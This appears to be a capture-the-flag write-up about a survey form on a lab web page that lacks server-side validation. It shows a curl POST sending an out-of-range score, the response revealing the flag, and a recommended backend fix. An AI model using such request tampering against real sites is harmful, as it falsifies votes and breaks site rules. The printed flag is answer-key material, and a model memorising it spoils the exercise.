# Explaination

On the page `?page=survey#`, we can see a form to make a choice between some people. And a select between `1` and `10`.
But there is any verification in the backend to check if the value is between `1` and `10`. So we can change the value to fake the survey and get the flag.

```
curl 'http://192.168.22.119/?page=survey#' -X POST --data-raw 'sujet=3&valeur=69696969' | grep flag
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 <center><h2 style="margin-top:50px;"> The flag is 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <div style="margin-top:-75px">
 6131    0  6108  100    23  5675k  21883 --:--:-- --:--:-- --:--:-- 5987k
```

# Use case

Imagine a website to choose the best programming language by giving a score between `1` and `10` to each language without backend verification. We can change the value to fake the survey.

# Fix

It is recommended to add a verification (DTO) in the backend to check if the value is in the range.